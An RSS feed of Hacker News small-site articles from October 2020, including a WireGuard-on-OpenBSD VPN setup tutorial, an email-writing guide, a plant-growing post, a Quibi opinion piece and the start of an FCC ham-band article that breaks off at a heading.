<p>The slightly longer version goes like this: in the late 80s, some forward-thinking folks began thinking seriously about the fact that non-Americans were using computers. In fact, some of the world’s computer users weren’t even Europeans, who could usually get away with smuggling some funny accented Latin characters into that “unused” eighth bit of <a href="https://en.wikipedia.org/wiki/ASCII">ASCII</a>. Of course, the non-Latin alphabet folks were doing just fine on their own: they had their own character sets and encodings.</p>
<p>But wouldn’t it be nice if we could all share one universal character set? Some sort of… “Uni”versal “code”? Surely, they reasoned, the Chinese/Japanese/Korean (CJK) character sets, the Latin alphabet, the Cyrillic alphabet, and anything else of interest could all be encoded into a shared 16-bit range. 65,536 characters should be enough for all the world’s languages! We’d just decide that the new “character type” was a 16-bit integer instead of an 8-bit integer; strings could still be arrays of these characters, and doubling the storage required for existing ASCII text was an acceptable price to pay for global harmony. Big names committed to this new “Universal Character Set” (<a href="https://en.wikipedia.org/wiki/Universal_Coded_Character_Set">UCS-2</a>): Microsoft rebuilt Windows’ string handling to use strings of two-byte UCS-2 “wide characters”, and the hot new Java programming language made the same decision.</p>
<p>As you can imagine, 65,536 characters did not turn out to be nearly enough for all the world’s languages—much less the wave of weird 👩‍👩‍👦‍👦 characters 💯 yet to 🔜 appear. Unicode ended up adopting a 32-bit address space, supporting over 4 billion characters. We’re unlikely to fill that any time soon, even given the breathtaking pace of emoji creation.</p>
<p>However, it also …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://usethe.computer/posts/14-xmhell.html">http://usethe.computer/posts/14-xmhell.html</a></em></p>]]>
            </description>
            <link>http://usethe.computer/posts/14-xmhell.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24863352</guid>
            <pubDate>Thu, 22 Oct 2020 21:11:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Securely tunnel smart phone traffic with WireGuard and OpenBSD]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24862676">thread link</a>) | @URfejk
<br/>
October 22, 2020 | https://thomasward.com/openbsd-wireguard/ | <a href="https://web.archive.org/web/*/https://thomasward.com/openbsd-wireguard/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  

  
    <p>Posted on <time datetime="2020-10-18T00:00:00+00:00">October 18, 2020</time></p>
  

  

    <ul>
    
        <li>
            <a href="https://thomasward.com/openbsd-wireguard/#purpose">Purpose</a>
            
        </li>
    
        <li>
            <a href="https://thomasward.com/openbsd-wireguard/#introduction">Introduction</a>
            
                <ul>
                    
                        <li>
                            <a href="https://thomasward.com/openbsd-wireguard/#why-tunnel-internet-traffic">Why tunnel internet traffic?</a>
                        </li>
                    
                        <li>
                            <a href="https://thomasward.com/openbsd-wireguard/#what-is-wireguard">What is WireGuard?</a>
                        </li>
                    
                        <li>
                            <a href="https://thomasward.com/openbsd-wireguard/#what-will-things-look-like-at-the-end">What will things look like at the end?</a>
                        </li>
                    
                </ul>
            
        </li>
    
        <li>
            <a href="https://thomasward.com/openbsd-wireguard/#openbsd-configuration">OpenBSD Configuration.</a>
            
                <ul>
                    
                        <li>
                            <a href="https://thomasward.com/openbsd-wireguard/#network-setup">Network setup</a>
                        </li>
                    
                        <li>
                            <a href="https://thomasward.com/openbsd-wireguard/#wireguard-configuration">WireGuard Configuration</a>
                        </li>
                    
                        <li>
                            <a href="https://thomasward.com/openbsd-wireguard/#smart-phone-configuration">Smart phone configuration</a>
                        </li>
                    
                </ul>
            
        </li>
    
        <li>
            <a href="https://thomasward.com/openbsd-wireguard/#comments-questions-input-concerns">Comments, questions, input, concerns?</a>
            
        </li>
    
    </ul>

  
<p>Learn how to securely tunnel smart phone traffic
over a <a href="https://www.wireguard.com/">WireGuard</a> VPN with an
<a href="https://www.openbsd.org/">OpenBSD</a> 6.8 endpoint using the newly
released in-kernel <a href="https://man.openbsd.org/OpenBSD-6.8/wg">wg(4)</a>
driver with only base utilities.</p>

<h2 id="why-tunnel-internet-traffic">Why tunnel internet traffic?</h2>
<p>When you browse the internet, check emails, use social media, etc. on
your laptop or smart phone, the traffic must go from your device, through
the local network, then through the wider internet until it ultimately
reaches the destination server. Whoever runs the local Wi-Fi or cell
network can see what websites you visit, and if the connection to the
website is not encrypted, exactly what you are sending and receiving
from the site. Further, if the Wi-Fi network is not encrypted (an open
insecure network with no password), then any user on the network can
also read your traffic!</p>
<p>One way to keep your browsing and activity private and secured
from the people on the local network is to tunnel it through an
encrypted Virtual Private Network (VPN). I commonly do this when
using public Wi-Fi at airports, libraries, restaurants, etc. to
secure my internet traffic from potential eavesdroppers. Ways to
obtain a VPN include buying one from a commercial VPN provider, but
this shifts the issue of who can look at your traffic from people
on the Wi-Fi to this provider. Instead, I setup my own VPN (using
<a href="https://www.wireguard.com/">WireGuard</a>) on a virtual private server
(VPS) that I own on <a href="https://www.vultr.com/">Vultr</a> that runs on
<a href="https://www.openbsd.org/">OpenBSD</a>, my favorite operating system.</p>
<h2 id="what-is-wireguard">What is WireGuard?</h2>
<p><a href="https://www.wireguard.com/">WireGuard</a> is becoming the go-to software
to create a VPN. Compared to common alternatives (OpenVPN, IPsec) it
is simpler, faster, and uses modern cryptography (making it arguably
more secure). OpenBSD has had user-land support for WireGuard using
<a href="https://git.zx2c4.com/WireGuard-go/about/">WireGuard-go</a>. OpenBSD 6.8
was released today (2020-10-18) and now includes an in-kernel WireGuard
implementation <a href="https://man.openbsd.org/OpenBSD-6.8/wg">wg(4)</a>. Being
in-kernel, this implementation is faster. It also means we can skip
using extra software and use base-only utilities for simple, easy
configuration.</p>
<h2 id="what-will-things-look-like-at-the-end">What will things look like at the end?</h2>
<p>Your smart phone will enable the VPN through one-click on the WireGuard
app. All traffic on your phone will then go over an encrypted tunnel to
the OpenBSD endpoint server, after which, it will route to the rest of
the internet. This will protect your traffic from anyone snooping on the
Wi-Fi or cell network.</p>

<p>Below shows configuration for an OpenBSD server to be a WireGuard
endpoint. All instructions below pertain to OpenBSD 6.8 released on
2020-10-18.</p>
<h2 id="network-setup">Network setup</h2>
<p>Below will set-up some background configuration to allow tunneling of
packets and configure the firewall:</p>
<ol>
<li>
<p>Enable internet protocol (IP) forwarding</p>
<p>This will allow packets to move between the WireGuard interface
and the egress interface.</p>
<p>First enable it on the running system:</p>
<pre><code><span># sysctl net.inet.ip.forwarding=1
</span></code></pre>
<p>Then make it be enabled after system reboot:</p>
<pre><code><span># echo  'net.inet.ip.forwarding=1' &gt;&gt; /etc/sysctl.conf
</span></code></pre></li>
<li>
<p>Configure pf</p>
<p>Configure OpenBSD's firewall/packet filter,
<a href="https://man.openbsd.org/pf">pf(4)</a> to open the port for WireGuard,
allow traffic between WireGuard peers, and forward tunneled traffic
from the client to the internet. To do so, add the following lines
to your <a href="https://man.openbsd.org/pf.conf">pf.conf(5)</a>:</p>
<pre><code><span># wireguard
</span><span># open wireguard port
</span><span>pass in on egress proto udp from any to any port 51820
</span><span># allow communication between wireguard peers
</span><span>pass on wg0
</span><span># allow clients connected to wg0 to tunnel their outside world traffic
</span><span>pass out on egress inet from (wg0:network) nat-to (egress:0)
</span></code></pre></li>
</ol>
<h2 id="wireguard-configuration">WireGuard Configuration</h2>
<p>Previous to OpenBSD 6.8, configuration required the wireguard-tools
packages. Now that WireGuard is in base, we can do all
configuration with base utils. This is all nicely documented
in the manual pages ( <a href="https://man.openbsd.org/wg">wg(4)</a>,
<a href="https://man.openbsd.org/ifconfig">ifconfig(4)</a>) and summarised below:</p>
<h3 id="set-up-wg0">Set-up wg0</h3>
<ol>
<li>
<p>Generate a end point private key</p>
<p>WireGuard uses a Curve25519 key that is 32 bytes in length and
base64 encoded. A Curve25519 key needs 5 particular bits to be
configured in a certain way to valid, but wg(4) can correct
this from any randomly generated 32 bytes. Therefore, we just
need a 32 bytes random base 64 encoded string and can use
<a href="https://man.openbsd.org/openssl">openssl(1)</a> for that:</p>
<pre><code><span>$ openssl rand -base64 32 &gt; ep_private.key
</span></code></pre>
<p>This will save the private key to <code>ep_private.key</code>. Keep a hold of
this for now. We can delete it after the set-up is complete.</p>
</li>
<li>
<p>Bring up wg0 interface</p>
<pre><code><span># ifconfig wg0 create wgkey "$(cat ep_private.key)" wgport 51820
</span></code></pre></li>
<li>
<p>Save end point public key</p>
<p>Bringing up the wg0 interface generates a public key from the
private key. You will need to give this public key to the client (your
laptop, smart phone etc), so save it for now:</p>
<pre><code><span># ifconfig wg0 | grep wgpubkey | cut -d ' ' -f 2 &gt; ep_public.key
</span></code></pre></li>
<li>
<p>Assign wg0 an IP address</p>
<p>This IP address will be the IP address your endpoint will have on
the VPN. The OpenBSD endpoint will be reachable at 10.0.0.1
by clients (smartphone, laptop, etc) which will also be on the
10.0.0.0/24 subnet. I recommend picking an ip address range randomly
to prevent any collision between a network you may join and your
WireGuard network (eg 10.12.24.0/24). To keep things simple for this
tutorial I'll just use 10.0.0.0/24 subnet and give the end point the
first IP address:</p>
<pre><code><span># ifconfig wg0 10.0.0.1/24
</span></code></pre></li>
</ol>
<p>wg0 is now set up and functional.</p>
<h3 id="generate-public-private-key-pair-for-client">Generate public/private key pair for client</h3>
<p>Below is a bit of a hack so we can use base utilities only. It brings
up a temporary wg interface with a generated private key just so we can
extract the generated public key.</p>
<ol>
<li>
<p>Generate a client private key</p>
<pre><code><span>$ openssl rand -base64 32 &gt; client1_private.key
</span></code></pre>
<p>This will save the private key to <code>client1_private.key</code>. Keep a hold of
this for now. We can delete it after the set-up is complete.</p>
</li>
<li>
<p>Bring up wg1 interface</p>
<p>Note, I'm picking a different port (this can be whatever you want)
since wg0 is already up on 51820.</p>
<pre><code><span># ifconfig wg1 create wgkey "$(cat client1_private.key)" wgport 51822
</span></code></pre></li>
<li>
<p>Save client public key</p>
<p>You will need to use this public key on the OpenBSD endpoint in
order for the client to connect. </p>
<pre><code><span># ifconfig wg1 | grep wgpubkey | cut -d ' ' -f 2 &gt; client1_public.key
</span></code></pre></li>
<li>
<p>Remove the temporary wg1 interface</p>
<p>This will remove the temporary interface we created to extract keys:</p>
<pre><code><span># ifconfig wg1 destroy
</span></code></pre></li>
</ol>
<h3 id="finalize-setting-up-openbsd-endpoint">Finalize setting up OpenBSD Endpoint</h3>
<p>Now that we have the client's public key, we can establish a WireGuard
peer on the endpoint to allow the client to connect:</p>
<pre><code><span># ifconfig wg0 wgpeer "$(cat client1_public.key)" wgaip 10.0.0.2/32
</span></code></pre>
<p>This will limit the IP address of the peer to 10.0.0.2. Changed the IP
address to the IP address you would like on the subnet you picked.</p>
<h3 id="enable-configuration-to-persist-on-reboot">Enable configuration to persist on reboot</h3>
<p>With the above instructions, your endpoint works. However, it will not
work once you reboot the operating system. Save this configuration with
the below text in <code>/etc/hostname.wg0</code>:</p>
<pre><code><span>wgkey REPLACE_WITH_EP_PRIVATE_KEY wgport 51820
inet 10.0.0.1 255.255.255.0
wgpeer REPLACE_WITH_CLIENT1_PUBLIC_KEY \
        wgaip 10.0.0.2/32
</span></code></pre>
<p>Making sure to replace <code>REPLACE_WITH_EP_PRIVATE_KEY</code> with the text stored
in <code>ep_private.key</code> and <code>REPLACE_WITH_CLIENT1_PUBLIC_KEY</code> with the text
stored in <code>client1_public.key</code>.</p>
<p>Make sure the permissions for <code>/etc/hostname.wg0</code> are correct so users
outside of root and those in the group wheel cannot read the keys:</p>
<pre><code><span># chmod 640 /etc/hostname.wg0
# chown root:wheel /etc/hostname.wg0
</span></code></pre>
<p>Now, after a reboot OpenBSD will bring up the WireGuard endpoint for you
automatically.</p>
<h2 id="smart-phone-configuration">Smart phone configuration</h2>
<p>With the endpoint set-up, now you just need to configure your smart
phone to use the tunnel. The authors of WireGuard provide apps for both
<a href="https://play.google.com/store/apps/details?id=com.wireguard.android&amp;hl=en_US&amp;gl=US">Android</a>
and
<a href="https://apps.apple.com/us/app/wireguard/id1441195209">iOS</a>. These
applications make configuration easy. You just need to take a photo of a
QR code made from a client.conf that you can write on your computer. The
client.conf should have the following contents:</p>
<pre><code><span>[Interface]
PrivateKey = REPLACE_WITH_CLIENT1_PRIVATE_KEY
Address = 10.0.0.2/24

[Peer]
PublicKey = REPLACE_WITH_EP_PUBLIC_KEY
AllowedIPs = 0.0.0.0/0
Endpoint = OPENBSD_EP_IP_ADDRESS:51820
</span></code></pre>
<p>Make sure to replace <code>REPLACE_WITH_CLIENT1_PRIVATE_KEY</code> with the
contents from <code>client1_private.key</code>, <code>REPLACE_WITH_EP_PUBLIC_KEY</code> with
the contents from <code>ep_public.key</code>, and <code>OPENBSD_EP_IP_ADDRESS</code> with the
IPv4 address of your OpenBSD end point.</p>
<p>Next, generate a qr code with this information using the <code>libqrencode</code>
package. If you do not want to install a package outside of base, you
can enter the above info by hand into your phone instead. Then do the
following to create the code:</p>
<pre><code><span>$ qrencode -t ansiutf8 &lt; client.conf
</span></code></pre>
<p>If you have issues taking a photo from the QR code generated in your
terminal, you can also save it as an image and take a photo of the
image.</p>
<p>Open your WireGuard application and take a photo of the QR code,
and the app is now configured! Toggle the switch in the app
to turn it on. To verify it is working, go to a website like
<a href="http://icanhazip.com/">icanhazip.com</a> to see your IP address. It should
change when the WireGuard tunnel is up to the same address as your
OpenBSD end point.</p>
<p>Once everything works, if you want, you can delete the key files and client.conf:</p>
<pre><code><span>$ rm {client1,ep}_{public,private}.key
$ rm client.conf
</span></code></pre>
<p>Enjoy securely tunneling your traffic with WireGuard!</p>

<p>Please contact me with any questions or input on the article using any
of the methods on my <a href="https://www.thomasward.com/contact/">contact page</a>.</p>

</article></div>]]>
            </description>
            <link>https://thomasward.com/openbsd-wireguard/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24862676</guid>
            <pubDate>Thu, 22 Oct 2020 19:58:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Write Effective Email]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24862543">thread link</a>) | @_chrischae
<br/>
October 22, 2020 | https://www.hyperinbox.app/blog/how-to-write-effective-email | <a href="https://web.archive.org/web/*/https://www.hyperinbox.app/blog/how-to-write-effective-email">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>There isn't a more dramatic love/hate relationship in professional communication than we have with emails. There are at least a dozen emails we all regret hitting "send" without looking over one more time. The static nature of its inability to edit calls for precision in writing and clarity to what you're trying to achieve.</p><p>As <a href="https://waitbutwhy.com/2013/12/11-awkward-things-about-email.html">Tim Urban</a> said before, not having an email today would be the equivalent of not having a phone number. Everything goes through email. But more importantly, Email is how we communicate for work. It is the lowest common denominator for every working professional in the world to communicate.</p><p>This is why we all need to be writing effective emails. Writing better emails allows us to do more things with less time (fewer threads) and keep our minds focused on important things.</p><p>Throughout my career with IBM and Walmart, and now with Hyperinbox as a founder, I've read tens of thousands of emails that could have been written better. I've written emails that I wish I could take back and write them again.</p><p>From my learnings on email, I have two pieces of advice on writing better emails. Aside from fundamental grammar and formatting, these two learning points have served me well thus far in handling email communication.</p><p>I've also read others' take on writing better emails. There are literally guides, books, lectures, and seminars on how to write a good email. You can look at them, but I think at the core of any communication, the most important factor to consider is putting yourself in the shoes of your audience. Hence, the two ways of writing an effective email:</p><ol start="" role="list"><li>Brevity and cutting through the chase</li><li>Communicating your agenda/goal in the email</li></ol><h3><strong>Brevity is a sign of respect. Get to the point.</strong></h3><p>Many people tend to write lengthy introductions before they talk about why they're sending the email in the first place. They usually start with a greeting, then assures they hope you're doing well, talk about the weather, then go through a whole bunch of B.S. before they finally write the ask.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5f6bafe1ce94407594a1c388/5f8f68ef2ff8472fafcd6721_Screen%20Shot%202020-10-19%20at%2014.05.18.png" loading="lazy" alt=""></p><figcaption>COVID-19 version.</figcaption></figure><p>As a busy founder, and this goes for any professional, email has become too much of a distraction, and all we want at the end of the day is a clear, empty inbox! And these fluffy opening statements don't help.</p><p>Keeping your messages short, concise, and straight to the point is a show of respect. You’re mindful of the reader's time. You are putting yourself in the shoes of your reader. Your reader doesn't want to read all of that opening statement. She just wants to get to the point.</p><p>If you respect other's time, send a concise email. Keep it short. You don't need "hope you're doing okay" or "how are you doing?" added to your email every time. I've also seen "I know you're a busy guy" or "since we know you're busy with everything." These are formalities that satisfy no one.</p><p>We include those as a courtesy and because we don't want to sound rude. But I would rather read a cold but short and concise email than go through a 300-word heart-warming essay.</p><p>Here's an example:</p><p><code>
To: chris@pixelic.io<br>
From: james@company.com<br>
Subject: (subject untitled)<p>

Dear Chris,</p><p>

Hi! I know you're busy, so I'll make this quick.</p><p>

How are things? I’m currently working in Chicago and it’s been great! Summer is coming, so can’t complain too much about the chill weather right now.</p><p>

Anyways, I’ve been meaning to ask you for an introduction to John Doe from Company X I found him on LinkedIn, and it seems you are well connected to him! I’m working on a new project and I think John could help me out on X. </p><p>

Let me know if I could be of help with anything!<br>
All the best,</p><p>

James</p><p>

VP of Marketing | Company X<br>
Email: james@company.com<br>
Phone: +1 (650) 123-1234<br>
LinkedIn | Facebook | Twitter</p></code></p><p>What if you can trim all of this down to this:</p><p><code>
To: chris@pixelic.io<br>
From: james@company.com<br>
Subject: Intro request<p>
  
Chris, can you introduce me to John Doe at Company X? I found him on LinkedIn and seems he can help me out on a project I'm working on.</p></code></p><p>Here's how you can trim your email:</p><ol start="" role="list"><li>Write shorter sentences.</li><li>Stay away from fluffy, ambiguous words</li><li>Talk direct.</li><li>But don't be an asshole - you do want to write long whenever necessary. Know when to write long.</li></ol><h3><strong>Communicate your agenda clearly.</strong></h3><p>Naval Ravikant, co-founder of AngelList, has a great template for rejecting meeting requests. Let's admire his template for a few seconds:</p><p><code>
Hey {{ first_name }},<p>

Just want to be upfront.</p><p>

I don’t do non-transactional meetings. I don’t do meetings without a strict agenda. <br>
I don’t do meetings unless we absolutely have to.</p><p>

Naval</p></code></p><p>Although I admit my heart would start pounding if I ever receive an email like this from him, this is how strict people should be about protecting their time and focus as they are finite resources that can be only used a set amount each day.</p><p>And the fact that I'm thinking my heart will pound if I ever get Naval's email tells me that I shouldn't be asking for things without setting a clear agenda for the requests that I make through email.</p><p>To be effective and get the most out of your emails, always clarify what you're looking for. Be clear about your motives. Outline what's in it for the reader as well.</p><p>Another part of communicating your agenda clearly is to write the "so what" before anything. Here's an example, though not an email:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f6bafe1ce94407594a1c388/5f8f69c254117f7899006f2d_P4-xnIpw.png" loading="lazy" alt=""></p></figure><p>This is Mark Zuckerberg's Facebook post a few months ago, calling that health workers need more protective gear. See how he started his "so what" first and then laid out the details? This is what effective communication looks like.</p><p>In your email, do the same: write the "so what" first, and then lay out the details that support your point.<br></p><p>‍</p><p>--</p><p><em>If you are remote, and want a universal inbox that integrates with all of your daily apps (Figma, Slack, Github, Jira, Asana, etc.), </em><a href="https://www.producthunt.com/upcoming/hyperinbox"><em>join the Hyperinbox waitlist</em></a><em>. And follow us on Twitter,</em><a href="https://twitter.com/hyperinboxapp"><em> @hyperinboxapp</em></a><em>!</em></p></div></div>]]>
            </description>
            <link>https://www.hyperinbox.app/blog/how-to-write-effective-email</link>
            <guid isPermaLink="false">hacker-news-small-sites-24862543</guid>
            <pubDate>Thu, 22 Oct 2020 19:46:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[There are many reasons why everyone should grow a plant, but you need just one]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 15 (<a href="https://news.ycombinator.com/item?id=24862187">thread link</a>) | @roboben
<br/>
October 22, 2020 | https://permapeople.org/blog/2020/10/22/many-reasons-to-grow-a-plant.html | <a href="https://web.archive.org/web/*/https://permapeople.org/blog/2020/10/22/many-reasons-to-grow-a-plant.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><img src="https://permapeople.org/blog/assets/permapeople-grow-one-plant.jpg" alt="Permapeople tomatoes in a bowl"></p>

<p><strong>tl;dr If every person on the planet grows 10 tomato plants a year, we could offset Germany’s annual CO2 emissions.</strong></p>

<p>I think everyone should grow some plants. If you have a (backyard) garden, a balcony, or just a windowsill, you should grow something. There are a lot of direct and indirect benefits from doing that. I will focus on some of these.</p>

<h2 id="to-help-regenerate-the-environment">To help regenerate the environment</h2>

<p>I think this the most obvious and should be enough to start growing whatever you like immediately. One tomato plant fixates 1.5kg of CO2 per year on average[1]. If every person on the planet grows 10 plants a year (~ 7.594.000.000 people), we could sequester ~1.1 billion tons of CO2. This is more than the annual CO2 emissions of Germany.[2] Sure this is a simple calculation, and it is not accounting for CO2 spend on the work and materials you need to grow that plant, but you get the idea of how powerful your backyard plot can be. Also don’t forget the billions of tomatoes this will produce and they would not need to be produced and delivered through highly emission inefficient food systems. If you really care about this reason, then there are plants for even better sequestration of CO2 than a tomato[3].</p>

<h2 id="to-lower-your-expenses">To lower your expenses</h2>

<p>Don’t worry. I am not talking about money here. Sure, many people have enough space to grow enough food to sell it at some scale, and you can try it with your 10 tomato plants from above, but you can lower your expenses by growing your own plants in many different ways. One obvious way is to consume your own produce. Suppose you use it for food, medicine, or raw materials like wood and fiber. If you can grow some things by yourself, you need to buy less.
Another way is to use it to swap your produce with friends, family, and neighbors with other products you are not producing by yourself.</p>

<h2 id="to-reconnect-to-nature">To (re)connect to nature</h2>

<p>Growing a plant is a magical experience. You will see the magic of life and how much patience you need for this to happen. Seeing the first little green spikes pushing out of the soil will make you happier than the last binge-watching session you had. And imagine all that excitement and waiting for the first ripe tomato for you to harvest. It will feel like being five again waiting for Christmas. And then you eat the fruit that you grew by yourself, and you taste pure success. If you need a visual to that feeling, watch the scene of Castaway with Tom Hanks when he managed to make fire. Just do it without the fire, please, or you will kill your happily grown CO2 offset.</p>

<p>Happy growing 🌱✌️,</p>

<p>Ben</p>

<p><img src="https://media3.giphy.com/media/3KVcFEmdDl9NYaFTtx/giphy.gif?cid=ecf05e47p2dwmizlja50dggq5bnj7w7zxz6i535j3o9vjq6f&amp;rid=giphy.gif" alt="I made fire"></p>

<p>[1] <a href="http://www.lessco2.es/pdfs/noticias/ponencia_cisc_ingles.pdf">http://www.lessco2.es/pdfs/noticias/ponencia_cisc_ingles.pdf</a></p>

<p>[2] <a href="https://ourworldindata.org/co2/country/germany?country=~CHN">https://ourworldindata.org/co2/country/germany?country=~CHN</a></p>

<p>[3] <a href="https://www.researchgate.net/post/Which_plants_and_trees_consume_the_maximum_amount_of_polluted_gases_in_the_atmosphere">https://www.researchgate.net/post/Which_plants_and_trees_consume_the_maximum_amount_of_polluted_gases_in_the_atmosphere</a></p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://permapeople.org/blog/2020/10/22/many-reasons-to-grow-a-plant.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24862187</guid>
            <pubDate>Thu, 22 Oct 2020 19:17:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Laugh at Quibi's Failure?]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 66 (<a href="https://news.ycombinator.com/item?id=24862104">thread link</a>) | @kjcharles
<br/>
October 22, 2020 | https://keenen.xyz/quibi/ | <a href="https://web.archive.org/web/*/https://keenen.xyz/quibi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://s3.amazonaws.com/keenen-blog/2020/10/Quibi-Logo-1-.png 300w,
                            https://s3.amazonaws.com/keenen-blog/2020/10/Quibi-Logo-1-.png 600w,
                            https://s3.amazonaws.com/keenen-blog/2020/10/Quibi-Logo-1-.png 1000w,
                            https://s3.amazonaws.com/keenen-blog/2020/10/Quibi-Logo-1-.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://s3.amazonaws.com/keenen-blog/2020/10/Quibi-Logo-1-.png" alt="Why Laugh At Quibi's Failure?">
            </figure>

            <section>
                <div>
                    <p>There seems to be a fundamental misconception of why people are enjoying Quibi's demise. Startup vets seem to believe it's making fun of people who took a big swing and failed.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">The glee about Quibi's failure seems to me misguided. Startups are hard. There's no honor in applauding when they fail. To me it's impressive that people so established would undertake a project so risky. Especially considering the probable reaction if they failed.</p>— Paul Graham (@paulg) <a href="https://twitter.com/paulg/status/1319301182796517379?ref_src=twsrc%5Etfw">October 22, 2020</a></blockquote>

</figure><p>But it's far from that. It's not just that Quibi was a terrible idea, a lot of products begin as terrible sounding ideas and then take off. There were a ton of jokes about Snapchat's disappearing messages when it first launched. </p><p>The joy of Quibi's demise has more to do with seeing numerous bad decisions have an unsurprisingly poor outcome.</p><h2 id="authenticity">Authenticity</h2><p>Consumers want authenticity. Not just from art but from the products they use and the creators behind them. From its inception, Quibi failed the authenticity smell check. It had a ton of funding. Executives with decades of experience. And a splashy launch that few can afford. Shows from big-name creators and actors didn't help either. </p><p>It all felt like some huge media company trying to shove its product down our throat. A lot like a notable failure they seemingly never heard about, go90.</p><p>Rather than take the approach of a startup to validate their idea they went full steam ahead assuming they knew exactly what people wanted.</p><h2 id="why-even-exist">Why Even Exist?</h2><p>If you're going to create a new product you better be able to convince people there's a reason it should exist. Most products solve some problem. Maybe a problem people weren't fully aware of before. Quibi never seemed clear on what it was solving.</p><p>Looking for shortform content? There's Youtube &amp; TikTok. Content on the go? Youtube, TikTok, Instagram. Content while at home? Netflix, Disney+, etc. Why would anyone pay for Quibi with all these free alternatives available?</p><h2 id="poor-tech">Poor Tech</h2><p>This is probably the most inexcusable aspect of it all. You raise all that money, hire a bunch of people, and still don't at least have a great app. Not being able to share clips. No TV support. Not even screenshot support. How did anyone miss those? Creating good content is difficult and failing at it can be excused. Netflix took years to reliably create good content. But failing at the basic aspects of your product is embarrassing.</p><h2 id="schadenfreude">Schadenfreude</h2><p>All these decisions (<a href="https://www.theverge.com/2020/10/22/21528404/quibi-shut-down-cost-subscribers-content-tv-movies-katzenberg-whitman-tiktok-netflix">and a bunch more</a>) put together painted Quibi as a company run by arrogant execs who thought their experience meant they knew better than their audience. And that advertising alone would be enough to create a successful product. </p><p>Seeing so much money wasted made laughing at their downfall easy. The internet values authenticity and will always ridicule hubris. Quibi's money couldn't make it go viral but their execs terrible decisions have done it with ease.</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to Keenen Charles</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://keenen.xyz/quibi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24862104</guid>
            <pubDate>Thu, 22 Oct 2020 19:11:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[FCC Set to Take Away Another Ham Radio Band in 2021]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 10 (<a href="https://news.ycombinator.com/item?id=24861870">thread link</a>) | @themoralone
<br/>
October 22, 2020 | http://k0lwc.com/fcc-will-take-away-another-ham-band-in-2021/ | <a href="https://web.archive.org/web/*/http://k0lwc.com/fcc-will-take-away-another-ham-band-in-2021/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-380">
	<!-- .entry-header -->

	<div>
		
<p>Say goodbye to another amateur radio band. The Federal Communication Commission (FCC) has ruled that it will revoke amateur radio privileges on the 3300-3500 MHz (9-cm Microwave band). The FCC will auction the band to wireless telecom companies to support 5G rollouts across the United States. The dates when amateur radio privileges will “sunset” have yet to be approved. Ham radio operators should expect this to occur sometime in 2021.&nbsp;</p>



<blockquote><p>“We adopt our proposal from the&nbsp;<em>Notice of Proposed Rulemaking</em>&nbsp;to remove the amateur allocation from the 3.3 – 3.5 GHz band,” the FCC said in its&nbsp;<em>Report and Order</em>&nbsp;(<a target="_blank" href="https://ecfsapi.fcc.gov/file/1002214202488/FCC-20-138A1.pdf" rel="noreferrer noopener"><strong><em>R&amp;O</em></strong></a>) and&nbsp;<em>Further Notice of Proposed Rulemaking&nbsp;</em>in WT Docket No. 19-348, adopted on September 30 and&nbsp;<a target="_blank" href="https://www.federalregister.gov/public-inspection/2020-22528/facilitating-shared-use-in-the-3100-3550-mhz-band" rel="noreferrer noopener"><strong>published</strong></a>&nbsp;October 9 in&nbsp;<em>The Federal Register</em>,&nbsp;<em>R&amp;O</em>. “[W]e adopt changes to our rules today that provide for the sunset of the secondary amateur allocation in the band, but allow continued use of the band for amateur operations, pending resolution of the issues raised in the&nbsp;<em>Further Notice</em>.”</p><cite>– Federal Communication Commission  </cite></blockquote>



<p>Many ham radio operators likely haven’t used the 9-centimeter band, but that doesn’t mean it’s dead. Operators are doing moonbounce operations, and other microwave experimenters are active on the band. The most exciting use could be the <a href="https://www.arednmesh.org/">Amateur Radio Emergency Data Network (AREDN)</a> project. The 9-centimeter band provides 24 channels on 3.5 GHz that are not currently shared with Part 15 users.&nbsp;AREDN mesh networks have proven to be useful in emergency situations. </p>







<p>We should all be asking the real question. Why is this happening? Look no further than the <a href="https://www.congress.gov/bill/115th-congress/senate-bill/19">MOBILE NOW Act</a>. The MOBILE NOW Act was introduced by Sen. John Thune (R-S.D.) in 2017 and signed by President Donald Trump in 2018. The legislation directs the FCC to make additional spectrum available to auction for mobile and fixed wireless broadband to support 5G development.&nbsp;</p>



<h2>Following the telecom money</h2>



